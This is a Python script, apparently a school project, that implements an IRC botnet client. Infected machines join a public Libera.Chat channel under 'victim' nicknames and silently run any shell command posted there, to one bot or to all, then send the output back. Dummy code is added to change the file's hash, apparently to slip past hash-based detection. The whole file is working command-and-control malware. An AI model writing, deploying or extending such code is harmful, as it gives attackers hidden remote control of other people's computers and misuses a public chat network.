import socket
import subprocess
import time
import random



#####                               ######                                               #####  
#     # ##### #    # #####  #   #    #     # #####   ####       # ######  ####  #####    #     # 
#         #   #    # #    #  # #     #     # #    # #    #      # #      #    #   #            # 
 #####    #   #    # #    #   #      ######  #    # #    #      # #####  #        #       #####  
      #   #   #    # #    #   #      #       #####  #    #      # #      #        #      #       
#     #   #   #    # #    #   #      #       #   #  #    # #    # #      #    #   #      #       
 #####    #    ####  #####    #      #       #    #  ####   ####  ######  ####    #      ####### 




# IRC Config
# This server is public and requiers no registration to use.
# Information regarding Libera.Chat is found at: https://libera.chat/guides/connect
server = "irc.libera.chat" 
network = "irc.libera.chat"
port = 6667

# Channel name
channel = "#testroomsp2"
# Botnick is victim + random numbers.
botnick = "victim" + str(int(round(random.random() * 100000)))
# The message variable used to respond to "schoolproject"
message = ":This is a great project!"

class IRC:
 
    irc = socket.socket()
  
    # Define the socket
    def __init__(self):
        self.irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    # Transfer data
    def send(self, channel, msg):
        time.sleep(1)
        self.irc.send(bytes("PRIVMSG " + channel + " " + msg + "\n", "UTF-8"))
 
    # Connect to the server
    def connect(self, server, port, channel, botnick):
        print("Connecting to: " + server)
        self.irc.connect((server, port))

        # Perform user authentication
        self.irc.send(bytes("USER " + botnick + " " + botnick +" " + botnick + " :StudyProject2\n", "UTF-8"))
        self.irc.send(bytes("NICK " + botnick + "\n", "UTF-8"))
        
        time.sleep(1)

        # join the channel
        self.irc.send(bytes("JOIN " + channel + "\n", "UTF-8"))

    # Get the response
    def get_response(self):
        time.sleep(1)
        resp = self.irc.recv(2040).decode("UTF-8")
 
        # Keeping the connection going.
        # The IRC-bot responds to PING by sending back "PONG"
        if resp.find('PING') != -1:
            self.irc.send(bytes('PONG ' + resp.split() [1] + '\r\n', "UTF-8"))                      
             
 
        return resp


# This function makes the client run the command found in the chatroom.
# The command runs in the background using subprocess.
# Client running script/program will not see the command being executed on their screen.
def run_command(command):
    output = ''
    command = command.rstrip()
    output = subprocess.getoutput(command)
    for line in output.split("\n"):
        irc.send(channel, " :"+line)


# Information that is sent to the server at loggin
irc = IRC()
irc.connect(server, port, channel, botnick)

# Upon connection to the chatroom
# prints the following message
irc.send(channel, " :Command to a specific target must start with CMD#::<nickname>::<commando>\r\n") # Command sendt to a specific user
irc.send(channel, " :Command sendt to all the targets must start with CMD#:<commando>\r\n") # Command sendt to all bots

# Responding to text found in the chatroom
while True:
    text = irc.get_response()
    print(text)

    # Responding to the word "test"
    if "PRIVMSG" in text and channel in text and "demo" in text:
        time.sleep(0.5)
        irc.send(channel, " :Hello World!\r\n")

    # Responding to the word "hi"
    if "PRIVMSG" in text and channel in text and "hi" in text:
        time.sleep(0.5)
        irc.send(channel, " :G'day mate!!")
 
    # Responding to the word "hello"
    if "PRIVMSG" in text and channel in text and "hello" in text:
        time.sleep(0.5)
        irc.send(channel, "Hello!")

    # Responding to word "schoolproject"
    if "PRIVMSG" in text and channel in text and "schoolproject" in text:
        time.sleep(0.5)
        # print(message)
        irc.send(channel, message)

    # Responding to "who are you"
    if "PRIVMSG" in text and channel in text and "who are you" in text:
        time.sleep(0.5)
        run_command("whoami")

    # Responding to commands given in chatroom.
    if text.find("CMD#::")!=-1: # command to a single target
        parts = text.split("::")
        if(parts[1]==botnick):
            run_command(parts[2])
    elif text.find("CMD#:")!=-1: # command to all the targets
        parts = text.split("CMD#:")
        run_command(parts[1])
    text = ""

# Dummy info to make program hash unique
7==7


# Dummy function to make program hash unique
def hogwash(twaddle):
    return 42